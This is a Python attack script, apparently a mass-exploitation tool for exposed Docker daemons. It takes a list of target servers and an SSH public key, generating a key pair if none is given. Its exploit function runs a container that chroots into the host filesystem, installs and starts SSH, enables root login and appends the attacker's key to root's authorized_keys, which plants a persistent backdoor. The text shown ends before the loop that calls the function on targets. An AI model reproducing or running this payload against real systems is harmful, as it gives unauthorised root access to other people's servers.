#! /usr/bin/env python3

import os, docker
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

allowed_images = ["ubuntu", "debian", "fedora"]
ssh_install_and_configure_commands = "apt install ssh -y && service ssh start && "

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def generatePublicPrivateKeys():
    display('*', "No Path Provided for Public Key File")
    display(':', "Creating New Private/Public Key Pairs")
    display('+', "Enter the file in which to save the key : ", end='')
    key_path = input()
    display('+', "Enter the Passphrase for the key : ", end='')
    key_passphrase = input()
    os.system(f"ssh-keygen -t rsa -b 4096 -C root -f '{key_path}' -N '{key_passphrase}'")
    return key_path

def findDockerImage(docker_client, image_name):
    for image in docker_client.images.list():
        for tag in image.tags:
            if tag.startswith(image_name):
                return tag
    return None
def exploit(docker_client, image_name, public_key, ssh_running):
    command_payload = ""
    if not ssh_running:
        command_payload += ssh_install_and_configure_commands
    command_payload += f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config && mv /tmp/sshd_config /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo {public_key} >> /root/.ssh/authorized_keys"
    docker_client.containers.run(image_name, f"chroot /host /bin/bash -c \"{command_payload}\"")

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
                              ('-p', "--public-key", "public_key", "Path for Public Key for SSH (Leave Empty to Generate New)"),
                              ('-T', "--timeout", "timeout", "Timeout for Request"),
                              ('-w', "--write", "write", "File to Dump Successful Exploited Targets (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
        except FileNotFoundError:
            arguments.target = arguments.target.split(',')
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.public_key:
        try:
            with open(arguments.public_key, 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
        except FileNotFoundError:
            key_path = generatePublicPrivateKeys()
            try:
                with open(f"{key_path}.pub", 'r') as file:
                    arguments.public_key = file.read().replace('\n', '').strip()
            except Exception as error:
                display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{arguments.public_key}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.timeout:
        arguments.timeout = None
    else:
        arguments.timeout = float(arguments.timeout)
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.txt"